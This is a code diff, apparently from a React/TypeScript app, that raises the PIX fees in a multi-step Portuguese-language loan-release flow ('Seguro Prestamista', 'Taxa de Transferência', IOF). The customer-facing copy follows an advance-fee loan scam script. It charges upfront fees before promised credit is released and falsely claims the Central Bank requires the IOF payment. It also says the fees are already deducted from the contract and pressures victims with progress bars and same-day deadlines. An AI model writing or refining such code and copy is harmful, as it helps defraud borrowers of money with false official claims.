@@ -42,18 +42,18 @@ const PAYMENT_PHASES: Record<PaymentPhaseId, PaymentPhaseConfig> = {
     id: "insurance",
     contentId: "seguro_prestamista",
     contentName: "Seguro Prestamista",
-    valueCents: 3179,
-    pixIntroText: "✅ Tudo pronto! Segue o PIX do Seguro Prestamista (R$ 31,79 — pagamento único). Assim que cair, libero o seu contrato e o seu crédito entra na fila de transferência. ⏳ O QR Code expira em 15 minutos.",
+    valueCents: 5279,
+    pixIntroText: "✅ Tudo pronto! Segue o PIX do Seguro Prestamista (R$ 52,79 — pagamento único). Assim que cair, libero o seu contrato e o seu crédito entra na fila de transferência. ⏳ O QR Code expira em 15 minutos.",
     // O fluxo do seguro tem caminho próprio (manual etc), não usa next aqui
   },
   taxa: {
     id: "taxa",
     contentId: "taxa_transferencia",
     contentName: "Taxa de Transferência",
-    valueCents: 1874,
+    valueCents: 2874,
     cardLabel: "Taxa de Transferência",
     cardSublabel: "Taxa de transferência interbancária:",
-    pixIntroText: "🚀 Etapa 2 de 5 — Taxa de Transferência Interbancária (R$ 18,74). É o que falta para o seu PIX de saída ser autorizado. Assim que confirmado, já avanço pro IOF.",
+    pixIntroText: "🚀 Etapa 2 de 5 — Taxa de Transferência Interbancária (R$ 28,74). É o que falta para o seu PIX de saída ser autorizado. Assim que confirmado, já avanço pro IOF.",
     nextIntroText: (firstName, valor) =>
       `✅ Taxa de Transferência confirmada!\n\n${firstName || "Você"}, seu progresso já está em 70% — falta MUITO POUCO pra ${formatCurrency(valor)} cair na sua conta. 💸\n\n👉 Próximo passo (etapa 3 de 5): IOF Federal — R$ 24,90\n\nO IOF (Imposto sobre Operações Financeiras) é cobrado pelo Banco Central em TODA liberação de crédito no Brasil — alíquota oficial vigente. Sem ele, o Bacen bloqueia automaticamente a transferência.\n\n🔒 Lembre: TODO valor pago aqui já está descontado do seu contrato. Não é custo a mais — é adiantamento de imposto que já estava previsto.\n\n⚠️ Atenção: a sua proposta tem prazo. Se você não concluir as etapas hoje, perde a aprovação e precisa refazer toda a análise.`,
     next: "iof",
@@ -647,7 +647,7 @@ const InsuranceCard = ({ onAccept, accepted, nome, cpf, dataNascimento, valor, p
         <div className="flex items-center justify-between gap-3">
           <div>
             <p className="text-xs text-white/70">Pagamento único</p>
-            <p className="text-xl font-extrabold">R$ 31,79</p>
+            <p className="text-xl font-extrabold">R$ 52,79</p>
             <p className="text-[10px] text-white/70">Não é mensalidade</p>
           </div>
           <div className="text-right">
@@ -731,7 +731,7 @@ const InsuranceCard = ({ onAccept, accepted, nome, cpf, dataNascimento, valor, p
                 {[
                   ["Plano", `${parcelas || 12}x de ${formatCurrency(valorParcela || 250)}`],
                   ["Início de Vigência", today],
-                  ["Pagamento único", "R$ 31,79"],
+                  ["Pagamento único", "R$ 52,79"],
                   ["SUSEP", "15414.901719/2014-89"],
                 ].map(([label, val]) => (
                   <div key={label} className="bg-[#003366]/5 border border-[#003366]/10 rounded-xl p-3 text-center">
